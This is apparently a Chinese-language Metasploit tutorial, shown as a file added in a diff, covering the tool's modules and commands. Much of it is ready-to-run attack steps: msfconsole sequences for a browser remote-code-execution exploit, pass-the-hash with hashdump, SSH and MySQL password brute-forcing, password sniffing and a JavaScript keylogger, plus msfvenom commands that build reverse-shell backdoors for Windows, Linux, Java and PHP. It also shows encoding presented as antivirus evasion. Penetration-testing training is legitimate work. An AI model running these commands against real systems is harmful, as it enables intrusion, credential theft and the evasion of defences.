@@ -1,0 +1,379 @@
+								Metasploit
+								
+								
+1.简介
+
+	Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，
+
+验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能
+
+包括智能开发，代码审计，Web应用程序扫描，社会工程。
+
+				
+				下载	 https://www.rapid7.com
+				
+				安装	 chmod 777 metasploit-latest-linux-x64-installer
+						 ./metasploit-latest-linux-x64-installer
+						 
+						 
+		msfbinscan－－对bin文件进行文件偏移地址扫描
+		msfconsole－－metasploit的基本命令行，集成了各种功能。
+		msfd－－metasploit服务，非持久性服务
+		msfrpc－－metasploit的服务端，非持久性的rpc服务
+		msfelfscan－－对linux的elf文件偏移地址进行扫描
+		msfmachscan－－功能同msfelfscan
+		msfpescan－－对windows的pe格式文件偏移地址进行扫描
+		msfvenom－－集成了msfpayload和msfencode的功能，效率更高，即将替代msf payload和msfencode
+		msfrpcd－－持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务，
+		可以通过xml进行数据传输。
+		msfupdate－－metasploit更新模块，可以用来更新metasploit模块
+
+
+		
+		
+2.exploits模块(溢出,漏洞;/opt/metasploit/apps/modules/exploits)
+	
+		exploits总的来说共分为两类溢出(exploit)攻击方法，即主动溢出和被动溢出。
+		
+主动溢出是针对目标主机的漏洞主动的进行攻击以获得控制权限，被动溢出是针对目标主机
+
+被动的监听然后获得相应的操作。在所有的exploit中，针对windows平台的最多，比其它所
+
+有平台的总和还要多。
+
+		缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用程序中广泛存在。
+		
+利用缓冲区溢出可民导致程序运行失败、系统死机、重新启动等后，也可以利用其获得非授权指令，
+
+甚至系统特权，进而进行各种非法的操作。
+
+
+========================================================
+	
+	(1)远程代码执行(ms12_004_midi)
+	
+		msf>search 12_004
+		msf>use exploit/windows/browser/ms12_004_midi
+		msf>show options
+		msf>set SRVHOST 本机ip
+		msf>set URIPATH /
+		msf>exploit
+		'Successful'
+		回车
+		msf>sessions
+		msf>sessions -i 1
+		meterpreter>shell
+		C:\windows\system32>
+		
+========================================================
+
+	(2)Hash值的传递
+	
+		(1)不知道密码
+		msf>use exploit/windows/smb/psexec
+		msf>show options
+		msf>set RHOST 192.168.0.200
+		msf>set SMBUser wing
+		msf>exploit
+		meterpreter>hashdump
+		meterpreter>exit
+		msf>set smbpass hash值
+		msf>exploit
+		meterpreter>shell
+
+==========================================================
+
+	
+	
+	
+3.auxiliary模块(辅助;/opt/metasploit/apps/modules/auxiliary)
+
+	Metasploit为渗透测试的信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、
+	
+构建虚假服务收集登录密码、口令猜测破解、敏感信息嗅探、探查敏感信息泄露、Fuzz测试发掘漏洞、实施网
+
+络协议欺骗等模块。辅助模块能够帮助渗透测试者在进行渗透攻击之前得到目标系统丰富的情报信息，从而发起
+
+更具目标性的精准攻击。
+
+===========================================================
+
+	(1)端口扫描
+	
+		msf>search portscan
+		msf>use auxiliary/scanner/portscan/tcp
+		msf>show options
+		msf>set RHOSTS 192.168.0.200
+		msf>run
+		msf>exit
+		
+=============================================================
+
+	(2)服务识别
+	
+		msf>use auxiliary/scanner/ssh/ssh_version
+		msf>show options
+		msf>set RHOSTS 192.168.0.200
+		msf>run
+		msf>exit
+	
+		msf>use auxiliary/scanner/ftp/ftp_version
+		msf>show options
+		msf>set RHOSTS 192.168.0.200
+		msf>run
+		msf>exit
+		
+==============================================================
+
+	(3)密码嗅探(嗅探明文密码)
+	
+		msf>use auxiliary/sniffer(嗅探器,抓数据包)/psnuffle
+		msf>show options
+		msf>run
+		msf>exit
+		
+==============================================================
+
+	
+	(4)口令安全检测
+	
+		msf>search mysql_login
+		msf>use auxiliary/scanner/mysql/mysql_login
+		msf>show options
+		msf>set RHOSTS 192.168.0.200
+		msf>set USERNAME root
+		msf>set PASS_FILE /root/file.txt
+		msf>set THREADS 10
+		msf>exploit
+	
+		msf>search ssh_login
+		msf>use auxiliary/scanner/ssh/ssh_login
+		msf>show options
+		msf>set RHOSTS 192.168.0.200
+		msf>set USERNAME root
+		msf>set PASS_FILE /root/file.txt
+		msf>set THREADS 10
+		msf>exploit
+		
+==============================================================
+
+	(5)XSS
+	
+		msf>search keylogger(键盘记录器)
+		msf>use auxiliary/server/capture/http_javascript_keylogger
+		msf>show options
+		msf>set DEMO true
+		msf>set URIPATH /
+		msf>set PORT 80
+		msf>run
+		
+==============================================================
+
+
+
+
+
+4.post模块(后渗透攻击;/usr/metasploit/apps/modules/post)
+
+	后渗透攻击模块（Post）是Metasploit v4版本中正式引入的一种新类型的组件模块，主要支持在渗透攻击
+	
+取得目标系统远程控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息、进一步拓展、
+
+实施跳板攻击等。
+
+	
+	
+	
+	
+
+5.msfconsole(主程序,基本命令行)
+	
+	
+	===================base==========================
+	
+		connect   	连接一个主机
+		exit/quit   退出MSF
+		help   		帮助菜单
+		info   		显示一个或多个模块的信息
+		load   		加载一个插件
+		loadpath 	在一个路径搜索并加载模块
+		search   	搜索模块名和描述
+		show   		显示所给类型的模块，或所有模块
+		unload   	卸载一个模块
+		use   		通过名称选择一个模块
+		workspace   工作空间
+		version   	显示MSF和控制台库版本号
+		
+		
+	=================database========================
+	
+		db_connect 		连接一个存在的数据库
+		db_disconnect 	断开与当前数据库实例的连接
+		db_create 		创建一个新的数据库实例
+		db_destroy 		删除一个存在的数据库
+		db_add_host 	添加一个或多个主机到数据库
+		db_add_port 	添加一个端口到主机
+		db_del_host 	从数据库删除一个或多个主机
+		db_del_port 	从数据库删除一个端口
+		db_hosts 		列出数据库中的所有主机
+		db_vulns 		列出数据库中的所有漏洞
+		db_services 	列出数据库中的所有服务
+
+
+		
+
+6.msfvenom(框架管理)
+
+	msfvenom [options] <VALUE=value>
+
+	-p, --payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，
+									请使用"-";或者stdin指定
+    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括:
+									payloads, encoders, nops, all
+    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
+    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+    -a, --arch       <architecture>  指定payload的目标架构
+        --platform   <platform>      指定payload的目标平台
+    -s, --space      <length>        设定有效攻击荷载的最大长度
+    -b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;
+    -i, --iterations <count>         指定payload的编码次数
+    -c, --add-code   <path>          指定一个附加的win32 shellcode文件
+    -x, --template   <path>          指定一个自定义的可执行文件作为模板
+    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+        --payload-options            列举payload的标准选项
+    -o, --out   <path>               保存payload
+    -h, --help                       查看帮助选项
+	-f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+									  asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, 
+									  exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, 
+									  msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection,
+									  vba, vba-exe, vba-psh, vbs, war
+									  bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl,
+									  pl, powershell, ps1, py, python, raw, rb, ruby, sh, 
+									  vbapplication, vbscript
+ 
+
+ 
+ 
+ 
+7.Encoders(编码器框架)
+
+	编码器的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，
+	
+这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完全输入到存有漏洞
+
+的软件例程中，从而使得渗透攻击触发漏洞之后无法正确执行攻击载荷，达成控制系统的目标。
+
+	编码器的第二个使命是对攻击载荷进行“免杀”处理，即逃避反病毒软件、IDS入侵检测系统
+	
+和IPS入侵防御系统的检测与阻断。
+
+
+================================================================
+	
+	(1)反反病毒(采用编码)
+
+		
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.200 
+		-i 10 -e x86/shikata_ga_nai -f exe -o /root/123.exe
+		
+		
+==================================================================
+	
+
+
+	
+
+8.NOP Generators(空指令生成器框架)
+	
+		空指令（NOP）是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，
+		
+最典型的空指令就是空操作，在x86 CPU体系架构平台上的操作码是0x90。
+
+	
+
+
+	
+	
+9.Palyloads(攻击载荷框架)
+		
+		攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为
+	
+渗透攻击者打开在目标系统上的控制会话连接。
+
+	
+==============================================================
+
+	(1)后门
+	
+	1)windows
+		msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.0.200 
+		-f exe -o /root/123.exe
+		
+		将123.exe放到windows下
+		
+		msf>search handler
+		msf>use exploit/multi/handler
+		msf>show options
+		msf>set payload windows/meterpreter/reverse_tcp
+		msf>show options
+		msf>set LHOST 192.168.0.200 
+		msf>exploit
+		meterpreter>shell
+	
+	2)linux
+	
+		msfvenom -p linux/x86/shell_reverse_tcp  LHOST=192.168.0.200 
+		-f sh -o /root/123
+		
+		将123放到linux下
+		
+		msf>search handler
+		msf>use exploit/multi/handler
+		msf>show options
+		msf>set payload linux/x86/shell_reverse_tcp
+		msf>show options
+		msf>set LHOST 192.168.0.200 
+		msf>exploit
+		meterpreter>shell
+		
+	3)java
+	
+		msfvenom -p java/meterpreter/reverse_tcp  LHOST=192.168.0.200 
+		-f java -o /root/123.java
+		
+	4)PHP
+	
+		msfvenom  -p php/meterpreter/reverse_tcp  LHOST=192.168.0.200 
+		-e php/base64 -t php -o /root/123.php
+		
+==============================================================
+
+	(2)自定义payload
+	
+		cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
+
+		利用模板(/opt/metasploit/apps/pro/data/exe_templates/)
+		
+		msfvenom -p windows/meterpreter/bind_tcp -x template_x64_windows.exe -f exe -o /root/123.exe
+
+		
+		
+		
+10.数据库PostgerSQL
+
+	
+	metasploit中默认使用postgres数据库,来进行数据库查询
+	
+	相关配置文件
+	
+	/opt/metasploit/apps/pro/ui/config/database.yml
+	
+	
+	
+	
+	
+
+
+
+	
